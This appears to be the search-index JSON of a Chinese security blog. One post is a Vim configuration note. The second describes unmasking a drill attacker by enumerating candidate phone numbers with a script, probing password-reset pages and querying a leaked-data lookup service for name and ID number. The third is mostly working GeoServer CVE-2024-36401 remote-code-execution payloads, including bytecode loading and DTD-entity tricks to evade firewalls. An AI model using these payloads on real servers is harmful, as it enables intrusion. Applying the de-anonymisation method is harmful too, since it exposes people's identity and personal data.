{"posts":[{"title":"VIM笔记","text":"自用的一些VIM基础配置 .vimrc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899set nuset autoreadset clipboard+=unnamed &quot; 共享剪贴板set rulerset tabstop=4set softtabstop=4set shiftwidth=4set expandtabset mouse=asyntax on &quot; 打开语法高亮colorschem gruvboxfiletype plugin indent on&quot; 自动补全括号引号大括号回车&quot; inoremap ' ''&lt;ESC&gt;i&quot; inoremap &quot; &quot;&quot;&lt;ESC&gt;i&quot; inoremap ( ()&lt;ESC&gt;i&quot; inoremap [ []&lt;ESC&gt;iinoremap { {}&lt;ESC&gt;i&quot; inoremap {&lt;CR&gt; {&lt;CR&gt;}&lt;ESC&gt;O&quot; function! ClosePair(char)&quot; if getline('.')[col('.') - 1] == a:char&quot; return &quot;\\&lt;Right&gt;&quot;&quot; else&quot; return a:char&quot; endif&quot; endfunction&quot; 把快速按jj映射为Esc键 inoremap jj &lt;Esc&gt;&quot; Plugins will be downloaded under the specified directory.call plug#begin(has('nvim') ? stdpath('data') . '/plugged' : '~/.vim/plugged')&quot; Declare the list of plugins.Plug 'tpope/vim-sensible'Plug 'junegunn/seoul256.vim'Plug 'scrooloose/nerdtree'Plug 'scrooloose/syntastic'Plug 'vim-airline/vim-airline'Plug 'vim-airline/vim-airline-themes'Plug 'valloric/youcompleteme'Plug 'github/copilot.vim'Plug 'rust-lang/rust.vim'&quot; List ends here. Plugins become visible to Vim after this call.call plug#end()&quot; 文件导航 https://vimawesome.com/plugin/nerdtree-red&quot; NERDtree 键盘映射nnoremap &lt;leader&gt;n :NERDTreeFocus&lt;CR&gt;nnoremap &lt;C-n&gt; :NERDTree&lt;CR&gt;nnoremap &lt;C-t&gt; :NERDTreeToggle&lt;CR&gt;nnoremap &lt;C-f&gt; :NERDTreeFind&lt;CR&gt;&quot; NERDtree 自动关闭&quot; Exit Vim if NERDTree is the only window remaining in the only tab.autocmd BufEnter * if tabpagenr('$') == 1 &amp;&amp; winnr('$') == 1 &amp;&amp; exists('b:NERDTree') &amp;&amp; b:NERDTree.isTabTree() | quit | endif&quot; Close the tab if NERDTree is the only window remaining in it.autocmd BufEnter * if winnr('$') == 1 &amp;&amp; exists('b:NERDTree') &amp;&amp; b:NERDTree.isTabTree() | quit | endif&quot; 防止其他缓冲区替代NERDtree&quot; If another buffer tries to replace NERDTree, put it in the other window, and bring back NERDTree.autocmd BufEnter * if bufname('#') =~ 'NERD_tree_\\d\\+' &amp;&amp; bufname('%') !~ 'NERD_tree_\\d\\+' &amp;&amp; winnr('$') &gt; 1 | \\ let buf=bufnr() | buffer# | execute &quot;normal! \\&lt;C-W&gt;w&quot; | execute 'buffer'.buf | endif&quot; 语法高亮 https://vimawesome.com/plugin/syntastic&quot; Syntastic 配置set statusline+=%#warningmsg#set statusline+=%{SyntasticStatuslineFlag()}set statusline+=%*let g:syntastic_always_populate_loc_list = 1let g:syntastic_auto_loc_list = 1let g:syntastic_check_on_open = 1let g:syntastic_check_on_wq = 0&quot; 底部状态栏 https://vimawesome.com/plugin/vim-airline-supermanlet g:airline#extensions#tabline#enabled = 1let g:airline#extensions#tabline#formatter = 'default'&quot; 自动补全 https://vimawesome.com/plugin/youcompletemelet g:ycm_autoclose_preview_window_after_completion=1let g:ycm_autoclose_preview_window_after_insertion=1let g:ycm_confirm_extra_conf=0set completeopt-=previewautocmd InsertLeave * if pumvisible() == 0|pclose|endif &quot;离开插入模式后自动关闭预览窗口let g:ycm_seed_identifiers_with_syntax=1 &quot; 语法关键字补全let g:ycm_enable_diagnostic_signs = 1&quot; copilot插件配置imap &lt;silent&gt;&lt;script&gt;&lt;expr&gt; &lt;C-J&gt; copilot#Accept(&quot;\\&lt;CR&gt;&quot;)let g:copilot_no_tab_map = v:true&quot; copilot选择下一个提示imap &lt;silent&gt;&lt;script&gt;&lt;expr&gt; &lt;C-]&gt; copilot#Next()&quot; copilot选择上一个提示imap &lt;silent&gt;&lt;script&gt;&lt;expr&gt; &lt;C-[&gt; copilot#Prev() 列删除 光标定位到要操作的地方。 CTRL+v 进入“可视 块”模式，选取这一列操作多少行。 d 删除。 列插入插入操作的话稍有区别。例如我们在每一行前都插入”() “： 光标定位到要操作的地方。 CTRL+v 进入“可视 块”模式，选取这一列操作多少行。 SHIFT+i(I) 输入要插入的内容。 ESC 按两次，会在每行的选定的区域出现插入的内容。 列替换方法一： ctrl + v ，切换到块操作模式。 使用j. l等键进行上下左右操作，选中要替换的列。 选中之后，按下 c 键，输入要替换的内容。这个时候会看到只有第一行被键入。 按下 esc 键，退出块操作模式，这时所有列的字符都会被替换。 方法二：选区，在 Visual 模式下选择区域后输入 : Vim 即可自动补全为 :'&lt;,'&gt;。 1:'&lt;,'&gt;s/foo/bar/g","link":"/posts/24ef6d80.html"},{"title":"溯源案例","text":"在某次演练中溯源到了4个红队仔，这里列举一个稍微有点曲折的案例。 百度ID攻击者在某次演练中，踩了公司部署的蜜罐，留下了百度ID 百度账号忘记密码 贴吧资料、历史发言https://www.82cat.com访问某个百度ID的贴吧主页推测攻击者是莆田人，一眼看上去是个女生，不过也有可能是攻击者养的号。 猜测手机号通过百度账号忘记密码的功能得到了攻击者手机号码的前三后二，又推测是莆田的人，所以可以搜索一下莆田移动手机号码的范围。一共20个号段，星号有100种组合方式，所以可以确定到2000个可能的号码。编写代码输出2000个可能的号码： 12345678910111213141516171819202122232425262728293031323334from itertools import productoriginal_array = [ &quot;1835040**X1&quot;, &quot;1835041**X1&quot;, &quot;1835042**X1&quot;, &quot;1835043**X1&quot;, &quot;1835044**X1&quot;, &quot;1835900**X1&quot;, &quot;1835901**X1&quot;, &quot;1835902**X1&quot;, &quot;1835903**X1&quot;, &quot;1835904**X1&quot;, &quot;1839600**X1&quot;, &quot;1839601**X1&quot;, &quot;1839602**X1&quot;, &quot;1839603**X1&quot;, &quot;1839604**X1&quot;, &quot;1839605**X1&quot;, &quot;1839606**X1&quot;, &quot;1839607**X1&quot;, &quot;1839608**X1&quot;, &quot;1839609**X1&quot;]combinations = [f&quot;{i:02}&quot; for i in range(100)]result = []for item in original_array: for combo in combinations: result.append(item.replace(&quot;**&quot;, combo))for res in result: print(res) CSDN+百度网盘确定手机号搞网络安全的，猜测他注册过CSDN不过分吧。可以通过找回密码的形式确定这个手机号是否注册过CSDN，并且不需要输入验证码。拿这些注册过CSDN账号的手机号，去百度网盘中搜索用户，如果头像一样，那么手机号就确定了。 尾声拿到手机号去社工库搜索，可以确定到姓名、身份证号码、毕业院校这些。后面就提交报告，让主办方确认到具体的人扣分就行了。","link":"/posts/d3a82281.html"},{"title":"GeoServer Bypass WAF","text":"简单总结一年来CVE-2024-36401在实战中绕过WAF的一些Tricks 受影响版本 GeoServer &lt; 2.23.6 2.24.0 &lt;= GeoServer &lt; 2.24.4 2.25.0 &lt;= GeoServer &lt; 2.25.2 GeoTools &lt; 29.6 31.0 &lt;= GeoTools &lt; 31.2 30.0 &lt;= GeoTools &lt; 30.4 获取图层原始信息1/geoserver/ows?service=WFS&amp;version=1.0.0&amp;request=GetCapabilities 常规PoC时间延时可以用于判断漏洞是否存在 12345678&lt;wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'&gt; &lt;wfs:Query typeNames='sf:archsites'/&gt; &lt;wfs:valueReference&gt;java.lang.Thread.sleep(1500)&lt;/wfs:valueReference&gt;&lt;/wfs:GetPropertyValue&gt; 命令执行WFS GetPropertyValue123456789101112131415&lt;wfs:GetFeature service=&quot;WFS&quot; version=&quot;1.1.0&quot; xmlns:topp=&quot;http://www.openplans.org/topp&quot; xmlns:wfs=&quot;http://www.opengis.net/wfs&quot; xmlns=&quot;http://www.opengis.net/ogc&quot; xmlns:gml=&quot;http://www.opengis.net/gml&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.opengis.net/wfs&quot;&gt; &lt;wfs:Query typeName=&quot;topp:states&quot;&gt; &lt;Filter&gt; &lt;Intersects&gt; &lt;PropertyName&gt;exec(java.lang.Runtime.getRuntime(),&quot;calc&quot;)&lt;/PropertyName&gt; &lt;/Intersects&gt; &lt;/Filter&gt; &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt; WFS GetFeature123456789101112131415161718&lt;wfs:GetFeature service=&quot;WFS&quot; version=&quot;1.0.0&quot; xmlns:topp=&quot;http://www.openplans.org/topp&quot; xmlns:wfs=&quot;http://www.opengis.net/wfs&quot; xmlns:ogc=&quot;http://www.opengis.net/ogc&quot; xmlns:gml=&quot;http://www.opengis.net/gml&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.opengis.net/wfs&quot;&gt; &lt;wfs:Query typeName=&quot;topp:states&quot;&gt; &lt;ogc:Filter&gt; &lt;ogc:BBOX&gt; &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),&quot;calc&quot;)&lt;/ogc:PropertyName&gt; &lt;gml:Box srsName=&quot;http://www.opengis.net/gml/srs/epsg.xml#4326&quot;&gt; &lt;gml:coordinates&gt;-75.102613,40.212597 -72.361859,41.512517&lt;/gml:coordinates&gt; &lt;/gml:Box&gt; &lt;/ogc:BBOX&gt; &lt;/ogc:Filter&gt; &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt; 加载任意字节码WFS GetPropertyValue123456789101112131415161718192021222324252627&lt;wfs:GetFeature service=&quot;WFS&quot; version=&quot;1.1.0&quot; xmlns:topp=&quot;http://www.openplans.org/topp&quot; xmlns:wfs=&quot;http://www.opengis.net/wfs&quot; xmlns=&quot;http://www.opengis.net/ogc&quot; xmlns:gml=&quot;http://www.opengis.net/gml&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.opengis.net/wfs&quot;&gt; &lt;wfs:Query typeName=&quot;topp:states&quot;&gt; &lt;Filter&gt; &lt;Intersects&gt; &lt;PropertyName&gt;eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'var str=&quot;字节码base64&quot;;var bt;try { bt = java.lang.Class.forName(&quot;sun.misc.BASE64Decoder&quot;).newInstance().decodeBuffer(str);} catch (e) { bt = java.util.Base64.getDecoder().decode(str);}var theUnsafe = java.lang.Class.forName(&quot;sun.misc.Unsafe&quot;).getDeclaredField(&quot;theUnsafe&quot;);theUnsafe.setAccessible(true);unsafe = theUnsafe.get(null);unsafe.defineAnonymousClass(java.lang.Class.forName(&quot;java.lang.Class&quot;), bt, null).newInstance();')&lt;/PropertyName&gt; &lt;/Intersects&gt; &lt;/Filter&gt; &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt; 有些站的WFS service可能是被禁用或者是损坏的状态，也有可能Layer根本不存在。这个时候可以借助WMS service解决上述问题。 WMS getMap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103POST /geoserver/wms HTTP/1.1Host: Content-Type: application/xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ogc:GetMap xmlns:ogc=&quot;http://www.opengis.net/ows&quot; xmlns:gml=&quot;http://www.opengis.net/gml&quot; version=&quot;1.2.0&quot; service=&quot;WMS&quot;&gt; &lt;StyledLayerDescriptor version=&quot;1.0.0&quot; xsi:schemaLocation=&quot;http://www.opengis.net/sld StyledLayerDescriptor.xsd&quot; xmlns=&quot;http://www.opengis.net/sld&quot; xmlns:ogc=&quot;http://www.opengis.net/ogc&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xmlns:dave=&quot;http://blasby.com&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt; &lt;UserLayer&gt; &lt;Name&gt;Inline&lt;/Name&gt; &lt;InlineFeature&gt; &lt;FeatureCollection&gt; &lt;featureMember&gt; &lt;BodyPart&gt; &lt;Type&gt;Mouth&lt;/Type&gt; &lt;polygonProperty&gt; &lt;gml:Polygon&gt; &lt;gml:outerBoundaryIs&gt; &lt;gml:LinearRing&gt; &lt;gml:coordinates&gt; 397,226 396,209 396,196 390,185 384,175 368,163 353,155 331,150 308,149 283,148 261,153 231,163 209,175 195,189 186,209 182,221 187,226 193,214 195,205 200,197 203,192 215,185 226,177 241,171 256,167 266,163 281,161 297,161 321,160 341,160 359,168 371,175 382,185 388,197 390,215 390,225 394,226 397,226 &lt;/gml:coordinates&gt; &lt;/gml:LinearRing&gt; &lt;/gml:outerBoundaryIs&gt; &lt;/gml:Polygon&gt; &lt;/polygonProperty&gt; &lt;/BodyPart&gt; &lt;/featureMember&gt; &lt;/FeatureCollection&gt; &lt;/InlineFeature&gt; &lt;UserStyle&gt; &lt;FeatureTypeStyle&gt; &lt;Rule&gt; &lt;Filter&gt; &lt;Or&gt; &lt;PropertyIsEqualTo&gt; &lt;PropertyName&gt;eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'var str=&quot;字节码base64&quot;;var bt;try { bt = java.lang.Class.forName(&quot;sun.misc.BASE64Decoder&quot;).newInstance().decodeBuffer(str);} catch (e) { bt = java.util.Base64.getDecoder().decode(str);}var theUnsafe = java.lang.Class.forName(&quot;sun.misc.Unsafe&quot;).getDeclaredField(&quot;theUnsafe&quot;);theUnsafe.setAccessible(true);unsafe = theUnsafe.get(null);unsafe.defineAnonymousClass(java.lang.Class.forName(&quot;java.lang.Class&quot;), bt, null).newInstance();')&lt;/PropertyName&gt; &lt;Literal&gt;Eye&lt;/Literal&gt; &lt;/PropertyIsEqualTo&gt; &lt;/Or&gt; &lt;/Filter&gt; &lt;PolygonSymbolizer&gt; &lt;Fill&gt; &lt;CssParameter name=&quot;fill&quot;&gt; &lt;ogc:Literal&gt;#DD06E0&lt;/ogc:Literal&gt; &lt;/CssParameter&gt; &lt;CssParameter name=&quot;fill-opacity&quot;&gt; &lt;ogc:Literal&gt;1.0&lt;/ogc:Literal&gt; &lt;/CssParameter&gt; &lt;/Fill&gt; &lt;Stroke&gt; &lt;CssParameter name=&quot;stroke&quot;&gt; &lt;ogc:Literal&gt;#FF00FF&lt;/ogc:Literal&gt; &lt;/CssParameter&gt; &lt;/Stroke&gt; &lt;/PolygonSymbolizer&gt; &lt;/Rule&gt; &lt;/FeatureTypeStyle&gt; &lt;/UserStyle&gt; &lt;/UserLayer&gt; &lt;/StyledLayerDescriptor&gt; &lt;BoundingBox&gt; &lt;gml:coord&gt; &lt;gml:X&gt;0&lt;/gml:X&gt; &lt;gml:Y&gt;0&lt;/gml:Y&gt; &lt;/gml:coord&gt; &lt;gml:coord&gt; &lt;gml:X&gt;500&lt;/gml:X&gt; &lt;gml:Y&gt;500&lt;/gml:Y&gt; &lt;/gml:coord&gt; &lt;/BoundingBox&gt; &lt;Output&gt; &lt;Format&gt;image/jpeg&lt;/Format&gt; &lt;Transparent&gt;false&lt;/Transparent&gt; &lt;Size&gt; &lt;Width&gt;501&lt;/Width&gt; &lt;Height&gt;501&lt;/Height&gt; &lt;/Size&gt; &lt;/Output&gt;&lt;/ogc:GetMap&gt; Bypass WAF其实绕过WAF的本质就是利用一切你所知的特性。此时，我们很容易想到：能不能利用XML的特性来重新构造上述PoC？ 使用 DTD 进行实体声明123456789101112131415161718192021222324252627&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY a &quot;eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'var str=&quot;&gt; &lt;!ENTITY g '&quot;' &gt; &lt;!ENTITY h '&quot;' &gt; &lt;!ENTITY i &quot;;var bt;try {bt = java.lang.Class.forName&quot;&gt; &lt;!ENTITY b '(&quot;sun.misc.BASE64Decoder&quot;).newInstance().decodeBuffer(str);} catch (e) { bt = java.util.Base64.getDecoder'&gt; &lt;!ENTITY c '().decode(str);}var theUnsafe = java.lang.Class.forName'&gt; &lt;!ENTITY d '(&quot;sun.misc.Unsafe&quot;).getDeclaredField(&quot;theUnsafe&quot;);theUnsafe.setAccessible(true);unsafe = theUnsafe.get(null);unsafe.defineAnonymousClass(java.lang.Class.forName'&gt; &lt;!ENTITY e '(&quot;java.lang.Class&quot;), bt, null).newInstance();'&gt; &lt;!ENTITY f &quot;')&quot;&gt;]&gt;&lt;wfs:GetFeature service=&quot;WFS&quot; version=&quot;1.1&quot; xmlns:topp=&quot;http://www.openplans.org/topp&quot; xmlns:wfs=&quot;http://www.opengis.net/wfs&quot; xmlns=&quot;http://www.opengis.net/ogc&quot; xmlns:gml=&quot;http://www.opengis.net/gml&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.opengis.net/wfs&quot;&gt; &lt;wfs:Query typeName=&quot;sf:archsites&quot;&gt; &lt;Filter&gt; &lt;Intersects&gt; &lt;PropertyName&gt;&amp;a;&amp;g;字节码base64字符串&amp;h;&amp;i;&amp;b;&amp;c;&amp;d;&amp;e;&amp;f;&lt;/PropertyName&gt; &lt;/Intersects&gt; &lt;/Filter&gt; &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt; 增强混淆： 公开一个项目demoGeoServerBypass 举一反三另外在XML文档中默认是支持HTML实体编码的，我们也可以根据这个特性对某些关键字符串进行编码，重新构造PoC。 后续会考虑编写一把梭的利用工具。 参考文章 GeoServer property RCE注入内存马 GeoServer Property evalute 远程代码执行漏洞 (CVE-2024-36401) 分析 GeoServer(CVE-2024-36401) JDK 11-22 通杀内存马利用总结 浅析GeoServer property 表达式注入代码执行(CVE-2024-36401) XML DTD","link":"/posts/ef0ee75d.html"}],"tags":[{"name":"VIM","slug":"VIM","link":"/tags/VIM/"},{"name":"蓝队","slug":"蓝队","link":"/tags/%E8%93%9D%E9%98%9F/"},{"name":"溯源","slug":"溯源","link":"/tags/%E6%BA%AF%E6%BA%90/"},{"name":"GeoServer","slug":"GeoServer","link":"/tags/GeoServer/"},{"name":"Bypass","slug":"Bypass","link":"/tags/Bypass/"},{"name":"WAF","slug":"WAF","link":"/tags/WAF/"}],"categories":[{"name":"VIM配置","slug":"VIM配置","link":"/categories/VIM%E9%85%8D%E7%BD%AE/"},{"name":"攻防","slug":"攻防","link":"/categories/%E6%94%BB%E9%98%B2/"}],"pages":[{"title":"","text":"google-site-verification: google3cff2a5bdd6598b0.html","link":"/google3cff2a5bdd6598b0.html"},{"title":"404","text":"404 Not Found.","link":"/404.html"},{"title":"About Me","text":"今天把工作以前的博客全部下架，一切从零开始。","link":"/about/index.html"}]}